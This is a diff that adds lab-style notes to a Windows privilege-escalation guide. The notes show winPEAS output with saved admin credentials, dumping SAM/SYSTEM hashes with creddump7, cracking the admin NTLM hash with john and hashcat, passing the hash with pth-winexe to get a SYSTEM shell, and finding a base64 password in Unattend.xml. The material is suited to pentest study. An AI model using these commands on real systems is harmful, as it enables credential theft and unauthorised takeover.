@@ -1065,7 +1065,19 @@ Unless the applications interact with Credential Manager, I don't think it is po
 > .\winPEASany.exe quiet cmd windowscreds
 ```
 
-2.It appears that saved credentials for the admin user exist.
+>2.It appears that saved credentials for the admin user exist.
+
+  >[+] Checking Credential manager()
+Currently stored credentials:
+>
+>    Target: WindowsLive:target=virtualapp/didlogical
+    >Type: Generic
+   > User: 02nfpgrklkitqatu
+  >  Local machine persistence
+>
+  >  Target: Domain:interactive=WIN-QBA94KB3IOF\admin
+>    Type: Domain Password
+  >  User: WIN-QBA94KB3IOF\admin
 
 3.We can verify this manually using the following command:
 Use the `cmdkey` to list the stored credentials on the machine.
@@ -1363,6 +1375,64 @@ Example content:
 
 ### SAM & SYSTEM backups
 
+^eea1bf
+
+Windows stores password hashes in the Security Account
+Manager (SAM).
+The hashes are encrypted with a key which can be found in a
+file named SYSTEM.
+If you have the ability to read the SAM and SYSTEM files, you
+can extract the hashes.
+
+The SAM and SYSTEM files are located in the
+C:\Windows\System32\config directory.
+The files are locked while Windows is running.
+Backups of the files may exist in the C:\Windows\Repair
+or C:\Windows\System32\config\RegBack directories.
+1.  run the winpeas
+`.\winPEASany.exe quiet filesinfo`
+
+>  [+] Looking for common SAM & SYSTEM backups()
+    C:\Windows\repair\SAM
+    C:\Windows\repair\SYSTEM`
+    
+2. Download the latest version of the creddump suite:
+` git clone https://github.com/Neohapsis/creddump7.git`
+
+3. Run the pwdump tool against the SAM and SYSTEM files to extract the hashes:
+`python2 creddump7/pwdump.py SYSTEM SAM` 
+```bash
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6ebaa6d5e6e601996eefe4b6048834c2:::
+user:1000:aad3b435b51404eeaad3b435b51404ee:91ef1073f6ae95f5ea6ace91c09a963a:::
+admin:1001:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
+```
+
+4. crack the admin user hash 
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt --show hash.txt 
+#or 
+hashcat -m 1000 --force
+a9fdfa038c4b75ebc76dc855dd74f0da
+/usr/share/wordlists/rockyou.txt
+```
+
+***Passing the Hash***
+Windows accepts hashes instead of passwords to
+authenticate to a number of services.
+We can use a modified version of winexe, pth-winexe to
+spawn a command prompt using the admin user’s hash.
+```bash
+pth-winexe -U
+'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe
+
+#Use the hash with pth-winexe to spawn a SYSTEM level command prompt
+pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe
+```
+
+***interesting directories to search for SAM file***  
 ```bash
 # Usually %SYSTEMROOT% = C:\Windows
 %SYSTEMROOT%\repair\SAM
@@ -1617,9 +1687,21 @@ To learn how attackers use COM Hijacking as a persistence mechanism check:
 [com-hijacking.md](com-hijacking.md)
 {% endcontent-ref %}
 
-### **Generic Password search in files and registry**
+### **Generic Password search in files and Configuration Files**
 
-
+^3efb2f
+Some administrators will leave configurations files on
+the system with passwords in them.
+The Unattend.xml file is an example of this.
+It allows for the largely automated setup of Windows
+systems.
+1.Use winPEAS to search for common files which may
+contain credentials:
+`.\winPEASany.exe quiet cmd searchfast filesinfo`
+> [+] Unnattend Files()
+ >   C:\Windows\Panther\Unattend.xml
+ >   ```xml
+<Password>                    <Value>cGFzc3dvcmQxMjM=</Value>                    <PlainText>false</PlainText>                </Password>```
 
 **Search for file contents**
 
@@ -1636,8 +1718,16 @@ dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
 where /R C:\ user.txt
 where /R C:\ *.ini
 ```
+2. The Unattend.xml file was found. View the contents:
+> `type C:\Windows\Panther\Unattend.xml`
 
-### Searching the Registry for Passwords
+***important directorie***
+```bash
+
+```
+
+ 
+### ***Searching the Registry for Passwords***
 
 ^39c818
 
